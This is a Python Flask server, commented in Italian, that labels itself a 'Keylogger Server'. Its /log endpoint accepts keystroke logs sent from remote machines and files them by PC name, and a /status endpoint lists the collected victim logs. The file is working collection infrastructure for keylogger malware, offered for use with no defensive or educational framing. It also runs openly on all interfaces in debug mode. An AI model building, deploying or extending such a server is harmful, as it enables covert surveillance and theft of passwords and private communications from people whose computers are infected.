from flask import Flask, request, jsonify
import os
import datetime
import logging

# Configurazione logging
LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log")
os.makedirs(LOG_DIR, exist_ok=True)

# File di log per l'attività della tastiera
ACTIVITY_LOG_PATH = os.path.join(LOG_DIR, "activity_log.txt")

# File di log per debugging del server
SERVER_LOG_PATH = os.path.join(LOG_DIR, "server_debug.log")

# Configurazione del logging
logging.basicConfig(
    filename=SERVER_LOG_PATH,
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

app = Flask(__name__)


@app.route("/")
def test():
    logging.info("Test endpoint chiamato")
    return "<h1>Keylogger Server Attivo</h1>", 200


@app.route("/log", methods=["POST"])
def log_root():
    logging.info(
        f"Ricevuta richiesta POST a /log con Content-Type: {request.content_type}"
    )

    try:
        # Verifica il tipo di contenuto e processa di conseguenza
        if request.is_json:
            data = request.get_json()
            logging.debug(f"Dati JSON ricevuti: {data}")

            if not data:
                logging.error("JSON vuoto o malformato")
                return jsonify({"error": "JSON vuoto o malformato"}), 400

            # Estrai i campi dal JSON
            log_content = data.get("log", "")
            pc_name = data.get("pc_name", "unknown")
            timestamp = data.get("timestamp", str(datetime.datetime.now()))

            # Crea un file per ogni PC
            pc_log_file = os.path.join(LOG_DIR, f"activity_{pc_name}.txt")

            # Scrivi nel file specifico del PC
            with open(pc_log_file, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {log_content}\n")

            # Scrivi anche nel file di log principale
            with open(ACTIVITY_LOG_PATH, "a", encoding="utf-8") as f:
                f.write(f"[PC: {pc_name}] [{timestamp}]\n{log_content}\n")

            logging.info(f"Log ricevuto da {pc_name}, {len(log_content)} caratteri")
            return jsonify({"status": "success", "message": "Log ricevuto"}), 200
        else:
            # Nel caso non sia JSON, prova a gestire form data
            form_data = request.form
            if form_data and "log" in form_data:
                log_content = form_data["log"]
                pc_name = form_data.get("pc_name", "unknown")

                with open(ACTIVITY_LOG_PATH, "a", encoding="utf-8") as f:
                    f.write(
                        f"[PC: {pc_name}] [{datetime.datetime.now()}]\n{log_content}\n"
                    )

                logging.info(f"Log (form) ricevuto da {pc_name}")
                return (
                    jsonify({"status": "success", "message": "Log (form) ricevuto"}),
                    200,
                )
            else:
                logging.error("Dati non validi o mancanti")
                return jsonify({"error": "Dati non validi"}), 400

    except Exception as e:
        logging.exception(f"Errore durante l'elaborazione della richiesta: {str(e)}")
        return jsonify({"error": f"Errore interno: {str(e)}"}), 500


@app.route("/status")
def status():
    """Endpoint per verificare lo stato del server e visualizzare statistiche"""
    try:
        # Calcola alcune statistiche
        stats = {
            "server_running": True,
            "server_time": str(datetime.datetime.now()),
            "log_dir_exists": os.path.exists(LOG_DIR),
            "log_files": os.listdir(LOG_DIR) if os.path.exists(LOG_DIR) else [],
        }

        # Aggiungi informazioni sulla dimensione dei file di log
        log_sizes = {}
        for log_file in stats["log_files"]:
            file_path = os.path.join(LOG_DIR, log_file)
            if os.path.isfile(file_path):
                log_sizes[log_file] = f"{os.path.getsize(file_path) / 1024:.2f} KB"

        stats["log_sizes"] = log_sizes

        return jsonify(stats), 200
    except Exception as e:
        logging.exception(f"Errore nell'endpoint status: {str(e)}")
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    # Verifica se le cartelle necessarie esistono
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        logging.info(f"Creata directory per i log: {LOG_DIR}")

    # Scrivi un messaggio iniziale nel file di log
    with open(ACTIVITY_LOG_PATH, "a", encoding="utf-8") as f:
        f.write(f"\n=== SERVER AVVIATO {datetime.datetime.now()} ===\n\n")

    logging.info("Server in avvio su 0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000, debug=True)
